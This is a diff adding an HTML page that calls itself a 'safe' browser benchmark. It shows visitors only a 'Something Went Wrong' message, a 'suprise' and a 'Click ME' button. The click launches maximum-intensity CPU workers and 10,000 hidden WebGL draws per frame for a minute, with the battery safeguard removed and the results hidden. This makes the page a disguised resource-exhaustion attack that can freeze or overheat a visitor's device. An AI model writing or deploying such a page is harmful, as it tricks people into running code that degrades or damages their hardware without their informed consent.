@@ -1,0 +1,355 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>High-Load Browser Benchmark (Safe)</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body { font-family: system-ui,Segoe UI,Roboto,Arial; margin: 20px; }
+    #controls { display:flex; gap:10px; align-items:center; margin-bottom:10px}
+    button { padding:8px 12px; }
+    canvas { border:1px solid #ddd; display:block; margin-top:10px; }
+    #status { margin-top:8px; color:#333; }
+    .chart { width:600px; height:120px; }
+  </style>
+</head>
+<body>
+  <h1>Something Went Wrong</h1>
+  <p>I have a suprise For you!</p>
+
+  <div id="controls" style="display:flex; justify-content:center; margin-top:40vh;">
+    <button id="start">Click ME</button>
+  </div>
+
+  <div id="status" style="display:none">Idle</div>
+
+  <!-- hidden canvas for GPU work (kept to perform GPU rendering but not shown) -->
+  <canvas id="gpuCanvas" width="640" height="360" style="display:none"></canvas>
+
+<script>
+/* -------------------------
+   Helper: Battery check
+   ------------------------- */
+async function checkBatteryOK() {
+  if (!('getBattery' in navigator)) return true; // unknown, assume OK
+  try {
+    const bat = await navigator.getBattery();
+    if (bat.level < 0.9) return false;
+    return true;
+  } catch (e) { return true; }
+}
+
+/* -------------------------
+   CPU worker code (string)
+   ------------------------- */
+const workerCode = `
+self.onmessage = function(e) {
+  const { cmd, intensity, durationMs, warmupMs, instances } = e.data;
+  if (cmd === 'run') {
+    const end = performance.now() + durationMs;
+    const warmEnd = performance.now() + warmupMs;
+    // Setup arrays to avoid GC during test
+    const N = 100000;
+    let A = new Float64Array(N);
+    for (let i=0;i<N;i++) A[i] = (i+1) * 0.000001;
+    let ops = 0;
+    function heavyStep() {
+      // micro-batch to avoid posting too frequently
+      // scale per-instance; keep per-worker batch reasonable
+      const batch = 50 + Math.floor(intensity * 40);
+      for (let b=0;b<batch;b++) {
+        // for each logical instance assigned to this worker, do inner work
+        for (let inst = 0; inst < (instances || 1); inst++) {
+          let s = 0;
+          for (let i=0;i<500;i+=5) {
+            let v = A[(i*7 + inst) % N];
+            v = Math.sqrt(v * (i+1)) + Math.sin(v) * 0.5;
+            A[(i*3 + inst) % N] = v;
+            s += (v * 1.000001) | 0;
+          }
+          ops++;
+        }
+      }
+      if (performance.now() < warmEnd) {
+        // warmup period, don't report
+        setTimeout(heavyStep, 0);
+      } else if (performance.now() < end) {
+        // report progress periodically
+        self.postMessage({type:'tick', ops:ops});
+        ops = 0;
+        setTimeout(heavyStep, 0);
+      } else {
+        self.postMessage({type:'done'});
+      }
+    }
+    heavyStep();
+  }
+};
+`;
+
+/* -------------------------
+   Main app state
+   ------------------------- */
+let workers = [];
+let cpuSamples = []; // per-second aggregated ops
+let gpuSamples = []; // per-second frames
+let runActive = false;
+let gpuFrameCount = 0;
+let lastFrameTick = 0;
+
+/* -------------------------
+   CPU controller
+   ------------------------- */
+function spawnWorkers(num, intensity, durationMs, warmupMs, instancesPerWorker) {
+  terminateWorkers();
+  workers = [];
+  for (let i=0;i<num;i++) {
+    const blob = new Blob([workerCode], {type: 'application/javascript'});
+    const url = URL.createObjectURL(blob);
+    const w = new Worker(url);
+    w.onmessage = (ev) => {
+      if (ev.data.type === 'tick') {
+        // accumulate per worker tick
+        const ops = ev.data.ops || 0;
+        // store into last slot
+        if (!cpuSamples.length) cpuSamples.push({t:Date.now(), ops:0});
+        cpuSamples[cpuSamples.length-1].ops += ops;
+      } else if (ev.data.type === 'done') {
+        w.terminate();
+      }
+    };
+    w.postMessage({cmd:'run', intensity:intensity, durationMs:durationMs, warmupMs:warmupMs, instances: instancesPerWorker});
+    workers.push(w);
+  }
+}
+
+function terminateWorkers() {
+  for (const w of workers) try { w.terminate(); } catch(e){}
+  workers = [];
+}
+
+/* -------------------------
+   GPU (WebGL) heavy shader
+   ------------------------- */
+function createGL(canvas) {
+  const gl = canvas.getContext('webgl', {antialias:false, preserveDrawingBuffer:false});
+  if (!gl) throw new Error('WebGL not supported');
+  gl.getExtension('OES_element_index_uint');
+  return gl;
+}
+
+function makeProgram(gl, vsSource, fsSource) {
+  function compile(src, type){
+    const s = gl.createShader(type);
+    gl.shaderSource(s, src);
+    gl.compileShader(s);
+    if(!gl.getShaderParameter(s, gl.COMPILE_STATUS)) {
+      throw new Error(gl.getShaderInfoLog(s));
+    }
+    return s;
+  }
+  const vs = compile(vsSource, gl.VERTEX_SHADER);
+  const fs = compile(fsSource, gl.FRAGMENT_SHADER);
+  const p = gl.createProgram();
+  gl.attachShader(p, vs);
+  gl.attachShader(p, fs);
+  gl.linkProgram(p);
+  if(!gl.getProgramParameter(p, gl.LINK_STATUS)) {
+    throw new Error(gl.getProgramInfoLog(p));
+  }
+  return p;
+}
+
+function createHeavyFragment(loopCount) {
+  // loopCount controls the inner loop iterations to scale GPU work
+  return `
+  precision highp float;
+  uniform float u_time;
+  uniform vec2 u_res;
+  void main() {
+    vec2 uv = (gl_FragCoord.xy / u_res - 0.5) * 2.0;
+    float x = uv.x, y = uv.y;
+    float acc = 0.0;
+    float cx = cos(u_time*0.3), sx = sin(u_time*0.2);
+    for (int i=0;i<${loopCount};i++) {
+      float f = float(i) * 0.6180339;
+      float r = length(vec2(x* (f+1.0), y * (f+1.0)));
+      float v = sin(r* (f+1.0) + u_time*0.001*float(i)) * cos(r*0.7 + cx);
+      acc += pow(abs(v)+0.0001, 0.7) * (1.0 + 0.3*fract(sin(f*12.9898)*43758.5453));
+      float nx = x*cx - y*sx;
+      float ny = x*sx + y*cx;
+      x = nx; y = ny;
+    }
+    acc = acc / float(${loopCount});
+    gl_FragColor = vec4(vec3(acc), 1.0);
+  }`;
+}
+
+/* We'll dynamically generate the fragment shader with a loop count based on user complexity. */
+
+/* -------------------------
+   Rendering & measurement
+   ------------------------- */
+let gl = null;
+let program = null;
+let timeLoc = null;
+let resLoc = null;
+let startTime = 0;
+let requestedStop = false;
+
+function startGPU(canvas, complexity) {
+  if (!gl) gl = createGL(canvas);
+  // create simple fullscreen quad
+  const vs = `
+    attribute vec2 a_pos;
+    void main(){ gl_Position = vec4(a_pos,0.0,1.0); }
+  `;
+  const innerLoops = Math.max(1, Math.floor(complexity * 3)); // scale loops
+  let fs = createHeavyFragment(10 * innerLoops);
+  program = makeProgram(gl, vs, fs);
+  const buf = gl.createBuffer();
+  gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+  gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
+  const posLoc = gl.getAttribLocation(program, 'a_pos');
+  gl.enableVertexAttribArray(posLoc);
+  gl.vertexAttribPointer(posLoc, 2, gl.FLOAT, false, 0, 0);
+  timeLoc = gl.getUniformLocation(program, 'u_time');
+  resLoc = gl.getUniformLocation(program, 'u_res');
+
+  startTime = performance.now();
+  gpuFrameCount = 0;
+  lastFrameTick = 0;
+  requestedStop = false;
+  // store draws-per-frame (instances) on the program object for the frame loop
+  program._instances = program._instances || 1;
+
+  function frame() {
+    if (requestedStop) return;
+    const t = performance.now() - startTime;
+    gl.viewport(0,0,canvas.width, canvas.height);
+    gl.useProgram(program);
+    gl.uniform1f(timeLoc, t);
+    gl.uniform2f(resLoc, canvas.width, canvas.height);
+    // simulate many parallel draws by repeating the full-screen draw multiple times
+    const draws = Math.max(1, program._instances || 1);
+    for (let di = 0; di < draws; di++) {
+      // inject a per-instance time offset to vary the workload
+      gl.uniform1f(timeLoc, t + di * 0.001);
+      gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
+    }
+    gpuFrameCount++;
+    // collect per-second samples
+    if (t - lastFrameTick >= 1000) {
+      const framesThisSecond = gpuFrameCount;
+      gpuSamples.push({t:Date.now(), fps: framesThisSecond});
+      gpuFrameCount = 0;
+      lastFrameTick = t;
+    }
+    // schedule next
+    requestAnimationFrame(frame);
+  }
+  requestAnimationFrame(frame);
+}
+
+function stopGPU() {
+  requestedStop = true;
+  // cleanup GL resources lightly
+  try {
+    if (gl) {
+      // gl.getExtension('WEBGL_lose_context')?.loseContext();
+    }
+  } catch(e){}
+}
+
+/* -------------------------
+   Chart draw helpers
+   ------------------------- */
+function drawLineChart(canvas, dataPoints, label, maxY) {
+  const ctx = canvas.getContext('2d');
+  const w = canvas.width, h = canvas.height;
+  ctx.clearRect(0,0,w,h);
+  ctx.fillStyle = '#fafafa';
+  ctx.fillRect(0,0,w,h);
+  ctx.strokeStyle = '#333';
+  ctx.beginPath();
+  const M = dataPoints.length;
+  if (M===0) {
+    ctx.fillStyle='#666'; ctx.fillText('No data yet',10,20); return;
+  }
+  const minT = dataPoints[0].t;
+  const maxT = dataPoints[dataPoints.length-1].t;
+  const rangeT = Math.max(1, maxT - minT);
+  for (let i=0;i<M;i++) {
+    const x = ((dataPoints[i].t - minT)/rangeT) * (w-40) + 30;
+    const val = (dataPoints[i][label] || 0);
+    const y = h - 10 - (val / (maxY||Math.max(...dataPoints.map(d=>d[label]||1)))) * (h-30);
+    if (i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);
+  }
+  ctx.stroke();
+  ctx.fillStyle = '#000';
+  ctx.fillText(label.toUpperCase(), 4,12);
+}
+
+/* -------------------------
+   Orchestration
+   ------------------------- */
+const startBtn = document.getElementById('start');
+const gpuCanvas = document.getElementById('gpuCanvas');
+
+startBtn.addEventListener('click', async () => {
+  // battery check removed per user request: allow running on battery
+  if (runActive) return;
+  // Forced test parameters per request
+  const durationMs = 60 * 1000; // 60 seconds
+  const intensity = 10; // max on original 1..10 scale
+  const shaderComplex = 8; // max on original 1..8 scale
+  // reset state
+  cpuSamples = [];
+  gpuSamples = [];
+  runActive = true;
+  startBtn.disabled = true;
+  status.textContent = 'Warming up (3s)...';
+  // spawn workers
+  const cores = navigator.hardwareConcurrency || 4;
+  const warmupMs = 3000;
+  // CPU and GPU instances per new request
+  const cpuInstances = 5000;
+  const gpuInstances = 10000;
+  const instancesPerWorker = Math.max(1, Math.floor(cpuInstances / cores));
+  spawnWorkers(cores, intensity, durationMs + warmupMs, warmupMs, instancesPerWorker);
+  // start GPU with GPU instance count; set draws per frame to gpuInstances
+  startGPU(gpuCanvas, shaderComplex);
+  if (program) program._instances = gpuInstances;
+
+  // measurement timer: stop after durationMs
+  const startT = Date.now();
+  const interval = setInterval(() => {
+    const elapsed = Date.now() - startT;
+    if (elapsed >= durationMs) {
+      clearInterval(interval);
+      finalizeRun();
+    }
+  }, 1000);
+});
+
+function finalizeRun(manual=false) {
+  runActive = false;
+  requestedStop = true;
+  terminateWorkers();
+  stopGPU();
+  startBtn.disabled = false;
+  // compute aggregate stats
+  const cpuOps = cpuSamples.map(s=>s.ops||0);
+  const gpuFps = gpuSamples.map(s=>s.fps||0);
+  function stats(arr) {
+    if (!arr.length) return {sum:0,avg:0,max:0,min:0};
+    const sum = arr.reduce((a,b)=>a+b,0);
+    return {sum, avg: sum/arr.length, max:Math.max(...arr), min:Math.min(...arr)};
+  }
+  const cpuStats = stats(cpuOps);
+  const gpuStats = stats(gpuFps);
+  status.textContent = 'Finished. CPU avg ops/sec: ' + Math.round(cpuStats.avg) + ', GPU avg FPS: ' + (gpuStats.avg?gpuStats.avg.toFixed(1):'0');
+}
+</script>
+</body>
+</html>
